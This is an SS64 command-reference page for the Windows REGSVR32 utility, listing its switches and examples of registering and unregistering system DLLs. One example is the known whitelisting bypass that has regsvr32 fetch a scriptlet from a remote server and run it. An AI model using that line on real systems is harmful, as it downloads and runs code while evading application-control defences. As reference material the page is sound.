---
title:
altTitle: SS64 Docs
date: 2016-09-04 19:26:55
useGithubLayout: false
---
<!-- #BeginLibraryItem "/Library/head_nt.lbi" --><!-- #EndLibraryItem --><h1>REGSVR32</h1>
<p>Register or unregister a DLL.</p>
<pre>Syntax
      REGSVR32 [/U] [/S] [/N] /I:[<i>CommandLine</i>] <i>DLL_Name</i><br>
Key
   /u          Unregister Server.

   /s          Silent, do not display dialogue boxes.

   /i          Call DllInstall to register the DLL.
               (when used with /u, it calls dll uninstall.)

   /n          Do not call DllRegisterServer, you must use this option with /i. 

  <i>CommandLine</i>  An optional command line for DllInstall

   /c          Console output (old versions only).</pre>
<p> <b>Examples</b></p>
<p>Unregister (disable) XP Zip folders<br>  
<span class="code">REGSVR32 <b>/u</b> C:\Windows\System32\zipfldr.dll</span></p>
<p>Unregister (Disable) CAB file viewer: <br>
<span class="code"> REGSVR32<b> /u</b> C:\Windows\System32\cabview.dll</span></p>
<p>Register (enable) <span>XP Zip folders<br>
</span>  <span class="code">REGSVR32 zipfldr.dll</span></p>
<p>Register (enable) <span>CAB file viewer:<br>
</span> <span class="code">REGSVR32 cabview.dll</span></p>
<p>Register Windows Update DLLs (for those times when XP repair <a href="http://windowssecrets.com/2007/09/27/03-Stealth-Windows-update-prevents-XP-repair">breaks</a> Windows Update) <br>
<span class="code">regsvr32 /s wuapi.dll<br>
regsvr32 /s wuaueng1.dll<br>
regsvr32 /s wuaueng.dll<br>
regsvr32 /s wucltui.dll<br>
regsvr32 /s wups2.dll<br>
regsvr32 /s wups.dll<br>
regsvr32 /s wuweb.dll</span></p>
<p>Register DAO 3.6 (Data Access Objects):<br>
<br>
<span class="code">REGSVR32 "C:\Program Files\Common Files\Microsoft Shared\DAO\DAO360.DLL"</span></p>
<p>Using UnRegister to trigger remote code execution (<a href="http://subt0x10.blogspot.co.uk/2016/04/bypass-application-whitelisting-script.html">undocumented</a>)<br>
<span class="code">REGSVR32 /s /n /u /i:http://server/file.sct scrobj.dll</span></p>
<p class="quote">“I was planning to go into architecture. But when I arrived, architecture was filled up. Acting was right next to it.  So I signed up for acting instead” ~ Tom Selleck (on his college registration experience)</p>
<p><b>Related:</b><br>
<br>
Delsrv - unregister a service with the Services Control Manager. (<a href="../links/windows.html#kits">Win 2K ResKit</a>)<br>
<a href="msiexec.html">MSIEXEC</a> - Microsoft Windows Installer <br>
<a href="rundll32.html">RUNDLL32</a> - Run a DLL command <br>
<a href="https://support.microsoft.com/kb/249873">Q249873</a> - Regsvr32 usage and error messages</p><!-- #BeginLibraryItem "/Library/foot_nt.lbi" --><p>
<!-- windows300 -->
<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-6140977852749469" data-ad-slot="7649547908"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
<hr>
<div id="bl" class="footer"><a href="regsvr32.html#"><img src="../images/top.png" width="30" height="22" alt="Back to the Top"></a></div>
<div id="br" class="footer, tagline">© Copyright <a href="../index.html">SS64.com</a> 1999-2016<br>
Some rights reserved</div><!-- #EndLibraryItem -->
